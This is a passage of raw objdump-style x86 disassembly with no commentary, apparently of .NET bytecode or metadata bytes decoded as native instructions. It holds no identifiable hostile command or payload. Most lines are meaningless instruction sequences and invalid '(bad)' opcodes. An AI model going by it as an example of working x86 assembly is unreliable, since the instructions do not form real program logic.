  40329f:	add    BYTE PTR [ebx],dl
  4032a1:	xor    BYTE PTR [ebx],al
  4032a3:	add    BYTE PTR [edi],ah
  4032a5:	add    BYTE PTR [eax],al
  4032a7:	add    BYTE PTR [edx],cl
  4032a9:	add    BYTE PTR [eax],al
  4032ab:	adc    DWORD PTR [ebx+0x4b],esi
  4032ae:	add    BYTE PTR [eax],al
  4032b0:	or     dh,BYTE PTR [edx+0x65]
  4032b3:	push   es
  4032b4:	add    BYTE PTR [eax+0x73],dh
  4032b7:	dec    esp
  4032b8:	add    BYTE PTR [eax],al
  4032ba:	or     al,BYTE PTR [ebx]
  4032bc:	jb     0x403264
  4032be:	add    al,BYTE PTR [eax]
  4032c0:	jo     0x403335
  4032c2:	test   DWORD PTR [eax],eax
  4032c4:	add    BYTE PTR [edx],cl
  4032c6:	jae    0x403317
  4032c8:	add    BYTE PTR [eax],al
  4032ca:	or     dh,BYTE PTR [ebx+0x50]
  4032cd:	add    BYTE PTR [eax],al
  4032cf:	or     cl,BYTE PTR [edx]
  4032d1:	push   es
  4032d2:	sub    al,BYTE PTR [eax]
  4032d4:	adc    esi,DWORD PTR [eax]
  4032d6:	add    al,0x0
  4032d8:	sub    DWORD PTR [eax],eax
  4032da:	add    BYTE PTR [eax],al
  4032dc:	or     al,BYTE PTR [eax]
  4032de:	add    BYTE PTR [ecx],dl
  4032e0:	jae    0x40332d
  4032e2:	add    BYTE PTR [eax],al
  4032e4:	or     al,BYTE PTR [ebx]
  4032e6:	jae    0x403334
  4032e8:	add    BYTE PTR [eax],al
  4032ea:	or     al,BYTE PTR ds:0x66972
  4032f0:	jo     0x403365
  4032f2:	test   DWORD PTR [eax],eax
  4032f4:	add    BYTE PTR [edx],cl
  4032f6:	add    al,0x73
  4032f8:	dec    esp
  4032f9:	add    BYTE PTR [eax],al
  4032fb:	or     dh,BYTE PTR [ebx+0x4f]
  4032fe:	add    BYTE PTR [eax],al
  403300:	or     dh,BYTE PTR [ebx+0x50]
  403303:	add    BYTE PTR [eax],al
  403305:	or     cl,BYTE PTR [edx]
  403307:	push   es
  403308:	sub    al,BYTE PTR [eax]
  40330a:	add    BYTE PTR [eax],al
  40330c:	adc    esi,DWORD PTR [eax]
  40330e:	add    al,0x0
  403310:	xor    al,BYTE PTR [eax]
  403312:	add    BYTE PTR [eax],al
  403314:	adc    al,0x0
  403316:	add    BYTE PTR [ecx],dl
  403318:	jae    0x403365
  40331a:	add    BYTE PTR [eax],al
  40331c:	or     dh,BYTE PTR [edx+0x20]
  40331f:	add    al,BYTE PTR [eax]
  403321:	jo     0x403396
  403323:	dec    esp
  403324:	add    BYTE PTR [eax],al
  403326:	or     dl,BYTE PTR [edi]
  403328:	lea    ecx,[eax+eax*1]
  40332b:	add    BYTE PTR [ecx],al
  40332d:	or     eax,DWORD PTR [edi]
  40332f:	push   ss
  403330:	add    esi,DWORD PTR [ebx+0x4d]
  403333:	add    BYTE PTR [eax],al
  403335:	or     ah,BYTE PTR [edx+0x4e7307]
  40333b:	add    BYTE PTR [edx],cl
  40333d:	jb     0x403383
  40333f:	add    al,BYTE PTR [eax]
  403341:	jo     0x4033b6
  403343:	dec    esp
  403344:	add    BYTE PTR [eax],al
  403346:	or     cl,BYTE PTR [edx]
  403348:	push   es
  403349:	sub    al,BYTE PTR [eax]
  40334b:	add    BYTE PTR [ebx],dl
  40334d:	xor    BYTE PTR [edx],al
  40334f:	add    BYTE PTR [ebx+0x0],al
  403352:	add    BYTE PTR [eax],al
  403354:	adc    eax,0x28110000
  403359:	mov    WORD PTR [eax],es
  40335b:	add    BYTE PTR [edx],cl
  40335d:	add    bh,BYTE PTR [ebx+0x12]
  403360:	add    BYTE PTR [eax],al
  403362:	add    al,0x33
  403364:	adc    eax,0x117b02
  403369:	add    BYTE PTR [edi+ebx*1],al
  40336c:	(bad)  
  40336d:	xor    ecx,DWORD PTR [ebx]
  40336f:	add    dl,BYTE PTR [esi]
  403371:	jge    0x403384
  403373:	add    BYTE PTR [eax],al
  403375:	add    al,0x2
  403377:	or     ch,BYTE PTR [ebx]
  403379:	adc    edx,DWORD PTR [esi]
  40337b:	jae    0x4033e6
  40337d:	add    BYTE PTR [eax],al
  40337f:	push   es
  403380:	or     al,BYTE PTR [esi]
  403382:	add    bh,BYTE PTR [ebx+0x16]
  403385:	add    BYTE PTR [eax],al
  403387:	add    al,0x7d
  403389:	push   ss
  40338a:	add    BYTE PTR [eax],al
  40338c:	add    al,0x6
  40338e:	add    bh,BYTE PTR [ebx+0x14]
  403391:	add    BYTE PTR [eax],al
  403393:	add    al,0x7d
  403395:	adc    eax,DWORD PTR [eax]
  403397:	add    BYTE PTR [esi+eax*1],al
  40339a:	sub    bl,BYTE PTR [esi]
  40339c:	add    ch,BYTE PTR [eax]
  40339e:	bound  eax,QWORD PTR [eax]
  4033a0:	add    BYTE PTR [esi],al
  4033a2:	sub    al,BYTE PTR [eax]
  4033a4:	sbb    esi,DWORD PTR [eax]
  4033a6:	add    eax,DWORD PTR [eax]
  4033a8:	leave  
  4033a9:	add    BYTE PTR [eax],al
  4033ab:	add    BYTE PTR [esi],dl
  4033ad:	add    BYTE PTR [eax],al
  4033af:	adc    DWORD PTR [edx],eax
  4033b1:	jnp    0x4033c4
  4033b3:	add    BYTE PTR [eax],al
  4033b5:	add    al,0xb
  4033b7:	pop    es
  4033b8:	inc    ebp
  4033b9:	add    eax,DWORD PTR [eax]
  4033bb:	add    BYTE PTR [eax],al
  4033bd:	add    eax,0xa3000000
  4033c2:	add    BYTE PTR [eax],al
  4033c4:	add    BYTE PTR [eax+0x0],bh
  4033c7:	add    BYTE PTR [eax],al
  4033c9:	cmp    BYTE PTR [esi+0x2000000],bl
  4033cf:	adc    eax,0x117d
  4033d4:	add    al,0x2
  4033d6:	pop    ss
  4033d7:	jge    0x4033ea
  4033d9:	add    BYTE PTR [eax],al
  4033db:	add    al,0x2
  4033dd:	add    bh,BYTE PTR [ebx+0x13]
  4033e0:	add    BYTE PTR [eax],al
  4033e2:	add    al,0x20
  4033e4:	adc    al,0x10
  4033e6:	add    BYTE PTR [eax],al
  4033e8:	outs   dx,DWORD PTR ds:[esi]
  4033e9:	lea    eax,[eax]
  4033eb:	add    BYTE PTR [edx],cl
  4033ed:	jge    0x403406
  4033ef:	add    BYTE PTR [eax],al
  4033f1:	add    al,0x2
  4033f3:	push   ss
  4033f4:	jge    0x40340e
  4033f6:	add    BYTE PTR [eax],al
  4033f8:	add    al,0x2b
  4033fa:	pop    ebx
  4033fb:	add    al,BYTE PTR [edx]
  4033fd:	jnp    0x403416
  4033ff:	add    BYTE PTR [eax],al
  403401:	add    al,0x2
  403403:	jnp    0x40341d
  403405:	add    BYTE PTR [eax],al
  403407:	add    al,0x9a
  403409:	jge    0x403420
  40340b:	add    BYTE PTR [eax],al
  40340d:	add    al,0x2
  40340f:	jnp    0x403426
  403411:	add    BYTE PTR [eax],al
  403413:	add    al,0x6f
  403415:	push   0xd00a0000
  40341a:	data16 add BYTE PTR [eax],al
  40341d:	add    DWORD PTR [eax],ebp
  40341f:	xor    eax,0x280a0000
  403424:	mov    es,WORD PTR [eax]
  403426:	add    BYTE PTR [edx],cl
  403428:	sub    eax,0x7b02021e
  40342d:	adc    eax,0x7d040000
  403432:	adc    BYTE PTR [eax],al
  403434:	add    BYTE PTR [edx+eax*1],al
  403437:	sbb    BYTE PTR [ebp+0x11],bh
  40343a:	add    BYTE PTR [eax],al
  40343c:	add    al,0x17
  40343e:	or     bl,dh
  403440:	add    dl,BYTE PTR ss:[edi]
  403443:	jge    0x403456
  403445:	add    BYTE PTR [eax],al
  403447:	add    al,0x2
  403449:	add    bh,BYTE PTR [ebx+0x18]
  40344c:	add    BYTE PTR [eax],al
  40344e:	add    al,0x17
  403450:	pop    eax
  403451:	jge    0x40346b
  403453:	add    BYTE PTR [eax],al
  403455:	add    al,0x2
  403457:	jnp    0x403471
  403459:	add    BYTE PTR [eax],al
  40345b:	add    al,0x2
  40345d:	jnp    0x403476
  40345f:	add    BYTE PTR [eax],al
  403461:	add    al,0x8e
  403463:	imul   esi,DWORD PTR [edx],0x6a280295
  403469:	add    BYTE PTR [eax],al
  40346b:	push   es
  40346c:	push   ss
  40346d:	or     bl,dh
  40346f:	pop    es
  403470:	add    ch,BYTE PTR [eax]
  403472:	add    BYTE PTR [bx+si],al
  403475:	push   es
  403476:	fadd   QWORD PTR [esi]
  403478:	sub    al,BYTE PTR [eax]
  40347a:	add    BYTE PTR [eax],al
  40347c:	add    DWORD PTR [eax],edx
  40347e:	add    BYTE PTR [eax],al
  403480:	add    al,0x0
  403482:	add    BYTE PTR [eax],al
  403484:	rol    al,0x0
  403487:	pop    es
  403488:	add    BYTE PTR [eax],al
  40348a:	add    BYTE PTR [eax],al
  40348c:	push   ds
  40348d:	add    bh,BYTE PTR [ebx+0x10]
  403490:	add    BYTE PTR [eax],al
  403492:	add    al,0x2a
  403494:	sbb    dh,BYTE PTR [ebx-0x71]
  403497:	add    BYTE PTR [eax],al
  403499:	or     bh,BYTE PTR [edx+0x0]
  40349c:	adc    esi,DWORD PTR [eax]
  40349e:	add    al,BYTE PTR [eax]
  4034a0:	pop    ds
  4034a1:	add    BYTE PTR [eax],al
  4034a3:	add    BYTE PTR [edi],dl
  4034a5:	add    BYTE PTR [eax],al
  4034a7:	adc    DWORD PTR [edx],eax
  4034a9:	jnp    0x4034bc
  4034ab:	add    BYTE PTR [eax],al
  4034ad:	add    al,0xa
  4034af:	push   es
  4034b0:	pop    ss
  4034b1:	pop    ecx
  4034b2:	inc    ebp
  4034b3:	add    al,BYTE PTR [eax]
  4034b5:	add    BYTE PTR [eax],al
  4034b7:	add    DWORD PTR [eax],eax
  4034b9:	add    BYTE PTR [eax],al
  4034bb:	add    DWORD PTR [eax],eax
  4034bd:	add    BYTE PTR [eax],al
  4034bf:	sub    al,BYTE PTR [edx]
  4034c1:	sub    BYTE PTR [edx+0x0],ch
  4034c4:	add    BYTE PTR [esi],al
  4034c6:	sub    bl,BYTE PTR [esi]
  4034c8:	add    bh,BYTE PTR [ebx+0x10]
  4034cb:	add    BYTE PTR [eax],al
  4034cd:	add    al,0x2a
  4034cf:	data16 add ch,BYTE PTR [eax]
  4034d2:	push   ss
  4034d3:	add    BYTE PTR [eax],al
  4034d5:	or     al,BYTE PTR [edx]
  4034d7:	add    edi,DWORD PTR [ebp+0x11]
  4034da:	add    BYTE PTR [eax],al
  4034dc:	add    al,0x2
  4034de:	sub    BYTE PTR [eax+eax*1+0x127d0a00],cl
  4034e5:	add    BYTE PTR [eax],al
  4034e7:	add    al,0x2a
  4034e9:	and    al,BYTE PTR [edx]
  4034eb:	adc    eax,0x117d
  4034f0:	add    al,0x2a
  4034f2:	add    BYTE PTR [eax],al
  4034f4:	adc    esi,DWORD PTR [eax]
  4034f6:	add    al,BYTE PTR [eax]
  4034f8:	sbb    BYTE PTR [eax],al
  4034fa:	add    BYTE PTR [eax],al
  4034fc:	adc    eax,0x1f110000
  403501:	(bad)  
  403502:	jae    0x40356d
  403504:	add    BYTE PTR [eax],al
  403506:	push   es
  403507:	or     al,BYTE PTR [esi]
  403509:	add    bh,BYTE PTR [ebp+0x16]
  40350c:	add    BYTE PTR [eax],al
  40350e:	add    al,0x6
  403510:	add    edi,DWORD PTR [ebp+0x14]
  403513:	add    BYTE PTR [eax],al
  403515:	add    al,0x6
  403517:	sub    dl,BYTE PTR [ebx]
  403519:	xor    BYTE PTR [edx],al
  40351b:	add    BYTE PTR [ebx+0x0],al
  40351e:	add    BYTE PTR [eax],al
  403520:	sbb    BYTE PTR [eax],al
  403522:	add    BYTE PTR [ecx],dl
  403524:	sub    BYTE PTR [eax+eax*1+0x7b020a00],cl
  40352b:	sbb    eax,DWORD PTR [eax]
  40352d:	add    BYTE PTR [ebx+esi*1],al
  403530:	adc    eax,0x1a7b02
  403535:	add    BYTE PTR [edi+ebx*1],al
  403538:	(bad)  
  403539:	xor    ecx,DWORD PTR [ebx]
  40353b:	add    dl,BYTE PTR [esi]
  40353d:	jge    0x403559
  40353f:	add    BYTE PTR [eax],al
  403541:	add    al,0x2
  403543:	or     ch,BYTE PTR [ebx]
  403545:	adc    edx,DWORD PTR [esi]
  403547:	jae    0x4035bb
  403549:	add    BYTE PTR [eax],al
  40354b:	push   es
  40354c:	or     al,BYTE PTR [esi]
  40354e:	add    bh,BYTE PTR [ebx+0x1f]
  403551:	add    BYTE PTR [eax],al
  403553:	add    al,0x7d
  403555:	pop    ds
  403556:	add    BYTE PTR [eax],al
  403558:	add    al,0x6
  40355a:	add    bh,BYTE PTR [ebx+0x1d]
  40355d:	add    BYTE PTR [eax],al
  40355f:	add    al,0x7d
  403561:	sbb    al,0x0
  403563:	add    BYTE PTR [esi+eax*1],al
  403566:	sub    bl,BYTE PTR [esi]
  403568:	add    ch,BYTE PTR [eax]
  40356a:	imul   eax,DWORD PTR [eax],0x0
  40356d:	push   es
  40356e:	sub    al,BYTE PTR [eax]
  403570:	sbb    esi,DWORD PTR [eax]
  403572:	add    eax,DWORD PTR [eax]
  403574:	leave  
  403575:	add    BYTE PTR [eax],al
  403577:	add    BYTE PTR [esi],dl
  403579:	add    BYTE PTR [eax],al
  40357b:	adc    DWORD PTR [edx],eax
  40357d:	jnp    0x403599
  40357f:	add    BYTE PTR [eax],al
  403581:	add    al,0xb
  403583:	pop    es
  403584:	inc    ebp
  403585:	add    eax,DWORD PTR [eax]
  403587:	add    BYTE PTR [eax],al
  403589:	add    eax,0xa3000000
  40358e:	add    BYTE PTR [eax],al
  403590:	add    BYTE PTR [eax+0x0],bh
  403593:	add    BYTE PTR [eax],al
  403595:	cmp    BYTE PTR [esi+0x2000000],bl
  40359b:	adc    eax,0x1a7d
  4035a0:	add    al,0x2
  4035a2:	pop    ss
  4035a3:	jge    0x4035bf
  4035a5:	add    BYTE PTR [eax],al
  4035a7:	add    al,0x2
  4035a9:	add    bh,BYTE PTR [ebx+0x1c]
  4035ac:	add    BYTE PTR [eax],al
  4035ae:	add    al,0x20
  4035b0:	adc    al,0x4
  4035b2:	add    BYTE PTR [eax],al
  4035b4:	outs   dx,DWORD PTR ds:[esi]
  4035b5:	nop
  4035b6:	add    BYTE PTR [eax],al
  4035b8:	or     bh,BYTE PTR [ebp+0x20]
  4035bb:	add    BYTE PTR [eax],al
  4035bd:	add    al,0x2
  4035bf:	push   ss
  4035c0:	jge    0x4035e3
  4035c2:	add    BYTE PTR [eax],al
  4035c4:	add    al,0x2b
  4035c6:	pop    ebx
  4035c7:	add    al,BYTE PTR [edx]
  4035c9:	jnp    0x4035eb
  4035cb:	add    BYTE PTR [eax],al
  4035cd:	add    al,0x2
  4035cf:	jnp    0x4035f2
  4035d1:	add    BYTE PTR [eax],al
  4035d3:	add    al,0x9a
  4035d5:	jge    0x4035f5
  4035d7:	add    BYTE PTR [eax],al
  4035d9:	add    al,0x2
  4035db:	jnp    0x4035fb
  4035dd:	add    BYTE PTR [eax],al
  4035df:	add    al,0x6f
  4035e1:	push   0xd00a0000
  4035e6:	data16 add BYTE PTR [eax],al
  4035e9:	add    DWORD PTR [eax],ebp
  4035eb:	xor    eax,0x280a0000
  4035f0:	mov    es,WORD PTR [eax]
  4035f2:	add    BYTE PTR [edx],cl
  4035f4:	sub    eax,0x7b02021e
  4035f9:	push   ds
  4035fa:	add    BYTE PTR [eax],al
  4035fc:	add    al,0x7d
  4035fe:	sbb    DWORD PTR [eax],eax
  403600:	add    BYTE PTR [edx+eax*1],al
  403603:	sbb    BYTE PTR [ebp+0x1a],bh
  403606:	add    BYTE PTR [eax],al
  403608:	add    al,0x17
  40360a:	or     bl,dh
  40360c:	add    dl,BYTE PTR ss:[edi]
  40360f:	jge    0x40362b
  403611:	add    BYTE PTR [eax],al
  403613:	add    al,0x2
  403615:	add    bh,BYTE PTR [ebx+0x21]
  403618:	add    BYTE PTR [eax],al
  40361a:	add    al,0x17
  40361c:	pop    eax
  40361d:	jge    0x403640
  40361f:	add    BYTE PTR [eax],al
  403621:	add    al,0x2
  403623:	jnp    0x403646
  403625:	add    BYTE PTR [eax],al
  403627:	add    al,0x2
  403629:	jnp    0x40364b
  40362b:	add    BYTE PTR [eax],al
  40362d:	add    al,0x8e
  40362f:	imul   esi,DWORD PTR [edx],0x73280295
  403635:	add    BYTE PTR [eax],al
  403637:	push   es
  403638:	push   ss
  403639:	or     bl,dh
  40363b:	pop    es
  40363c:	add    ch,BYTE PTR [eax]
  40363e:	jo     0x403640
  403640:	add    BYTE PTR [esi],al
  403642:	fadd   QWORD PTR [esi]
  403644:	sub    al,BYTE PTR [eax]
  403646:	add    BYTE PTR [eax],al
  403648:	add    DWORD PTR [eax],edx
  40364a:	add    BYTE PTR [eax],al
  40364c:	add    al,0x0
  40364e:	add    BYTE PTR [eax],al
  403650:	rol    al,0x0
  403653:	pop    es
  403654:	add    BYTE PTR [eax],al
  403656:	add    BYTE PTR [eax],al
  403658:	push   ds
  403659:	add    bh,BYTE PTR [ebx+0x19]
  40365c:	add    BYTE PTR [eax],al
  40365e:	add    al,0x2a
  403660:	sbb    dh,BYTE PTR [ebx-0x71]
  403663:	add    BYTE PTR [eax],al
  403665:	or     bh,BYTE PTR [edx+0x0]
  403668:	adc    esi,DWORD PTR [eax]
  40366a:	add    al,BYTE PTR [eax]
  40366c:	pop    ds
  40366d:	add    BYTE PTR [eax],al
  40366f:	add    BYTE PTR [edi],dl
  403671:	add    BYTE PTR [eax],al
  403673:	adc    DWORD PTR [edx],eax
  403675:	jnp    0x403691
  403677:	add    BYTE PTR [eax],al
  403679:	add    al,0xa
  40367b:	push   es
  40367c:	pop    ss
  40367d:	pop    ecx
  40367e:	inc    ebp
  40367f:	add    al,BYTE PTR [eax]
  403681:	add    BYTE PTR [eax],al
  403683:	add    DWORD PTR [eax],eax
  403685:	add    BYTE PTR [eax],al
  403687:	add    DWORD PTR [eax],eax
  403689:	add    BYTE PTR [eax],al
  40368b:	sub    al,BYTE PTR [edx]
  40368d:	sub    BYTE PTR [ebx+0x0],dh
  403690:	add    BYTE PTR [esi],al
  403692:	sub    bl,BYTE PTR [esi]
  403694:	add    bh,BYTE PTR [ebx+0x19]
  403697:	add    BYTE PTR [eax],al
  403699:	add    al,0x2a
  40369b:	data16 add ch,BYTE PTR [eax]
  40369e:	push   ss
  40369f:	add    BYTE PTR [eax],al
  4036a1:	or     al,BYTE PTR [edx]
  4036a3:	add    edi,DWORD PTR [ebp+0x1a]
  4036a6:	add    BYTE PTR [eax],al
  4036a8:	add    al,0x2
  4036aa:	sub    BYTE PTR [eax+eax*1+0x1b7d0a00],cl
  4036b1:	add    BYTE PTR [eax],al
  4036b3:	add    al,0x2a
  4036b5:	and    al,BYTE PTR [edx]
  4036b7:	adc    eax,0x1a7d
  4036bc:	add    al,0x2a
  4036be:	add    BYTE PTR [eax],al
  4036c0:	adc    esi,DWORD PTR [eax]
  4036c2:	add    al,BYTE PTR [eax]
  4036c4:	sbb    BYTE PTR [eax],al
  4036c6:	add    BYTE PTR [eax],al
  4036c8:	sbb    BYTE PTR [eax],al
  4036ca:	add    BYTE PTR [ecx],dl
  4036cc:	pop    ds
  4036cd:	(bad)  
  4036ce:	jae    0x403742
  4036d0:	add    BYTE PTR [eax],al
  4036d2:	push   es
  4036d3:	or     al,BYTE PTR [esi]
  4036d5:	add    bh,BYTE PTR [ebp+0x1f]
  4036d8:	add    BYTE PTR [eax],al
  4036da:	add    al,0x6
  4036dc:	add    edi,DWORD PTR [ebp+0x1d]
  4036df:	add    BYTE PTR [eax],al
  4036e1:	add    al,0x6
  4036e3:	sub    dl,BYTE PTR [ebx]
  4036e5:	xor    BYTE PTR ds:0x4a00,al
  4036eb:	add    BYTE PTR [ecx],bl
  4036ed:	add    BYTE PTR [eax],al
  4036ef:	adc    DWORD PTR [ebx],eax
  4036f1:	outs   dx,DWORD PTR ds:[esi]
  4036f2:	pop    ebp
  4036f3:	add    BYTE PTR [eax],al
  4036f5:	or     dl,al
  4036f7:	jo     0x4036f9
  4036f9:	add    BYTE PTR [ecx],al
  4036fb:	sub    BYTE PTR ds:0x6f0a0000,dh
  403701:	push   ds
  403702:	add    BYTE PTR [eax],al
  403704:	or     dh,BYTE PTR [ebx+0x5e]
  403707:	add    BYTE PTR [eax],al
  403709:	or     dl,BYTE PTR [edi]
  40370b:	lea    edx,[edi+0x0]
  40370e:	add    BYTE PTR [ecx],al
  403710:	or     al,BYTE PTR [esi]
  403712:	push   ss
  403713:	rol    BYTE PTR [eax+0x0],1
  403716:	add    BYTE PTR [ecx],al
  403718:	sub    BYTE PTR ds:0x6f0a0000,dh
  40371e:	push   ds
  40371f:	add    BYTE PTR [eax],al
  403721:	or     dh,BYTE PTR [ebx+0x6d]
  403724:	add    BYTE PTR [eax],al
  403726:	or     dh,BYTE PTR [ebx+0x5f]
  403729:	add    BYTE PTR [eax],al
  40372b:	or     ah,BYTE PTR [edx+0x607306]
  403731:	add    BYTE PTR [edx],cl
  403733:	outs   dx,DWORD PTR ds:[esi]
  403734:	popa   
  403735:	add    BYTE PTR [eax],al
  403737:	or     ah,BYTE PTR [esi]
  403739:	sub    al,BYTE PTR [eax]
  40373b:	add    BYTE PTR [ebx],dl
  40373d:	xor    BYTE PTR ds:0x2100,al
  403743:	add    BYTE PTR [esi],cl
  403745:	add    BYTE PTR [eax],al
  403747:	adc    DWORD PTR [eax],ebp
  403749:	xor    DWORD PTR [eax],eax
  40374b:	add    BYTE PTR [edx],cl
  40374d:	jb     0x4036ea
  40374f:	push   es
  403750:	add    BYTE PTR [eax+0x17],dh
  403753:	lea    eax,[ecx]
  403755:	add    BYTE PTR [eax],al
  403757:	add    DWORD PTR [edx],ecx
  403759:	push   es
  40375a:	push   ss
  40375b:	add    ebp,DWORD PTR [edi+0x1e]
  40375e:	add    BYTE PTR [eax],al
  403760:	or     ah,BYTE PTR [edx+0x322806]
  403766:	add    BYTE PTR [edx],cl
  403768:	sub    bl,BYTE PTR [edx+0x2]
  40376b:	jnp    0x403772
  40376d:	add    BYTE PTR [eax],al
  40376f:	add    al,0x2c
  403771:	or     eax,0x57b02
  403776:	add    BYTE PTR [ebx+eax*1],al
  403779:	add    al,0x6f
  40377b:	xchg   ecx,eax
  40377c:	add    BYTE PTR [eax],al
  40377e:	or     ch,BYTE PTR [edx]
  403780:	add    BYTE PTR [edx],0x7b
  403783:	add    eax,0x2c040000
  403788:	pop    ss
  403789:	add    bh,BYTE PTR [ebx+0x5]
  40378c:	add    BYTE PTR [eax],al
  40378e:	add    al,0x72
  403790:	scas   eax,DWORD PTR es:[edi]
  403791:	push   es
  403792:	add    BYTE PTR [eax+0x3],dh
  403795:	sub    BYTE PTR [edx+0x40a0000],dl
  40379b:	outs   dx,DWORD PTR ds:[esi]
  40379c:	xchg   ecx,eax
  40379d:	add    BYTE PTR [eax],al
  40379f:	or     ch,BYTE PTR [edx]
  4037a1:	add    BYTE PTR [eax],al
  4037a3:	add    BYTE PTR [ebx],bl
  4037a5:	xor    BYTE PTR ds:0xa300,al
  4037ab:	add    BYTE PTR [edx],bl
  4037ad:	add    BYTE PTR [eax],al
  4037af:	adc    DWORD PTR [eax+ebp*1],eax
  4037b2:	xchg   ebx,eax
  4037b3:	add    BYTE PTR [eax],al
  4037b5:	or     ch,BYTE PTR ds:0x38280240
  4037bb:	add    BYTE PTR [eax],al
  4037bd:	push   es
  4037be:	pop    ss
  4037bf:	lea    eax,[ecx]
  4037c1:	add    BYTE PTR [eax],al
  4037c3:	add    DWORD PTR ds:0xa2041609,ecx
  4037c9:	or     DWORD PTR [eax],ebp
  4037cb:	and    eax,DWORD PTR [eax]
  4037cd:	add    BYTE PTR [esi],al
  4037cf:	sub    BYTE PTR [ecx],dh
  4037d1:	add    BYTE PTR [eax],al
  4037d3:	or     ch,BYTE PTR [eax]
  4037d5:	cmp    BYTE PTR [eax],al
  4037d7:	add    BYTE PTR [esi],al
  4037d9:	pop    ss
  4037da:	lea    eax,[ecx]
  4037dc:	add    BYTE PTR [eax],al
  4037de:	add    DWORD PTR [ebx],edx
  4037e0:	add    al,0x11
  4037e2:	add    al,0x16
  4037e4:	add    al,0xa2
  4037e6:	adc    DWORD PTR [eax+ebp*1],eax
  4037e9:	xor    al,BYTE PTR [eax]
  4037eb:	add    BYTE PTR [edx],cl
  4037ed:	jb     0x4037ae
  4037ef:	push   es
  4037f0:	add    BYTE PTR [eax+0x73],dh
  4037f3:	xor    eax,DWORD PTR [eax]
  4037f5:	add    BYTE PTR [edx],cl
  4037f7:	jp     0x403807
  4037f9:	add    al,0x28
  4037fb:	xchg   esp,eax
  4037fc:	add    BYTE PTR [eax],al
  4037fe:	or     cl,BYTE PTR [edx]
  403800:	add    al,0x5
  403802:	sub    BYTE PTR [ebp+0x720a0000],dl
  403808:	mov    DWORD PTR [esi],0x6f067000
  40380e:	xchg   esi,eax
  40380f:	add    BYTE PTR [eax],al
  403811:	or     ch,BYTE PTR [eax]
  403813:	xchg   edi,eax
  403814:	add    BYTE PTR [eax],al
  403816:	or     cl,BYTE PTR [ebx]
  403818:	pop    es
  403819:	jae    0x4037b3
  40381b:	add    BYTE PTR [eax],al
  40381d:	or     cl,BYTE PTR [esi+eax*1]
  403820:	add    ecx,DWORD PTR [eax]
  403822:	jae    0x4037bd
  403824:	add    BYTE PTR [eax],al
  403826:	or     ch,BYTE PTR [edi-0x66]
  403829:	add    BYTE PTR [eax],al
  40382b:	or     bl,dh
  40382d:	or     cl,BYTE PTR [eax]
  40382f:	sub    al,0x6
  403831:	or     BYTE PTR [edi+0x20],ch
  403834:	add    BYTE PTR [eax],al
  403836:	or     bl,ah
  403838:	add    dh,BYTE PTR [edx-0x35]
  40383b:	push   es
  40383c:	add    BYTE PTR [eax+0x17],dh
  40383f:	lea    eax,[ecx]
  403841:	add    BYTE PTR [eax],al
  403843:	add    DWORD PTR [ebx],edx
  403845:	add    eax,0x7160511
  40384a:	mov    ds:0x22280511,al
  40384f:	add    BYTE PTR [eax],al
  403851:	push   es
  403852:	sub    al,BYTE PTR [eax]
  403854:	add    DWORD PTR [eax],edx
  403856:	add    BYTE PTR [eax],al
  403858:	add    al,BYTE PTR [eax]
  40385a:	outs   dx,DWORD PTR ds:[esi]
  40385b:	add    BYTE PTR [edi],cl
  40385d:	jle    0x40385f
  40385f:	or     al,BYTE PTR [eax]
  403861:	add    BYTE PTR [eax],al
  403863:	add    BYTE PTR [ebx],al
  403865:	xor    BYTE PTR [edx],al
  403867:	add    BYTE PTR [eax+eax*1+0x0],al
  40386b:	add    BYTE PTR [eax],al
  40386d:	add    BYTE PTR [eax],al
  40386f:	add    BYTE PTR [edx],al
  403871:	sub    BYTE PTR [esi],dl
  403873:	add    BYTE PTR [eax],al
  403875:	or     al,BYTE PTR [edx]
  403877:	jae    0x403891
  403879:	add    BYTE PTR [eax],al
  40387b:	or     bh,BYTE PTR [ebp+0x7]
  40387e:	add    BYTE PTR [eax],al
  403880:	add    al,0x2
  403882:	sub    BYTE PTR [eax+eax*1+0x87d0a00],bl
  403889:	add    BYTE PTR [eax],al
  40388b:	add    al,0x2
  40388d:	adc    al,0x7d
  40388f:	or     DWORD PTR [eax],eax
  403891:	add    BYTE PTR [edx+eax*1],al
  403894:	push   ss
  403895:	jge    0x4038a1
  403897:	add    BYTE PTR [eax],al
  403899:	add    al,0x2
  40389b:	push   ss
  40389c:	jge    0x4038a9
  40389e:	add    BYTE PTR [eax],al
  4038a0:	add    al,0x2
  4038a2:	adc    al,0x7d
  4038a4:	or     eax,0x2040000
  4038a9:	jb     0x403896
  4038ab:	push   es
  4038ac:	add    BYTE PTR [eax+0x7d],dh
  4038af:	or     al,0x0
  4038b1:	add    BYTE PTR [edx+ebp*1],al
  4038b4:	push   0x2
  4038b6:	sub    BYTE PTR ds:0x2060000,ah
  4038bc:	add    edi,DWORD PTR [ebp+0x6]
  4038bf:	add    BYTE PTR [eax],al
  4038c1:	add    al,0x2
  4038c3:	add    ebp,DWORD PTR [edi+0x36]
  4038c6:	add    BYTE PTR [eax],al
  4038c8:	or     bh,BYTE PTR [ebp+0x9]
  4038cb:	add    BYTE PTR [eax],al
  4038cd:	add    al,0x2a
  4038cf:	push   ds
  4038d0:	add    bh,BYTE PTR [ebx+0x6]
  4038d3:	add    BYTE PTR [eax],al
  4038d5:	add    al,0x2a
  4038d7:	push   ds
  4038d8:	add    bh,BYTE PTR [ebx+0xc]
  4038db:	add    BYTE PTR [eax],al
  4038dd:	add    al,0x2a
  4038df:	add    BYTE PTR [ebx],0x28
  4038e2:	popf   
  4038e3:	add    BYTE PTR [eax],al
  4038e5:	or     ch,BYTE PTR ds:0x402810
  4038eb:	add    BYTE PTR [esi],al
  4038ed:	jb     0x4038e0
  4038ef:	push   es
  4038f0:	add    BYTE PTR [eax+0x73],dh
  4038f3:	xor    eax,DWORD PTR [eax]
  4038f5:	add    BYTE PTR [edx],cl
  4038f7:	jp     0x4038fb
  4038f9:	add    edi,DWORD PTR [ebp+0xc]
  4038fc:	add    BYTE PTR [eax],al
  4038fe:	add    al,0x2a
  403900:	push   ds
  403901:	add    bh,BYTE PTR [ebx+0x8]
  403904:	add    BYTE PTR [eax],al
  403906:	add    al,0x2a
  403908:	adc    esi,DWORD PTR [eax]
  40390a:	add    eax,0x4a00
  40390f:	add    BYTE PTR [esi],cl
  403911:	add    BYTE PTR [eax],al
  403913:	adc    DWORD PTR [ebx],eax
  403915:	sub    BYTE PTR [esi+0x2c0a0000],bl
  40391b:	or     al,0x2
  40391d:	sub    BYTE PTR [eax+eax*1+0x87d0a00],bl
  403924:	add    BYTE PTR [eax],al
  403926:	add    al,0x2a
  403928:	add    ebp,DWORD PTR [eax]
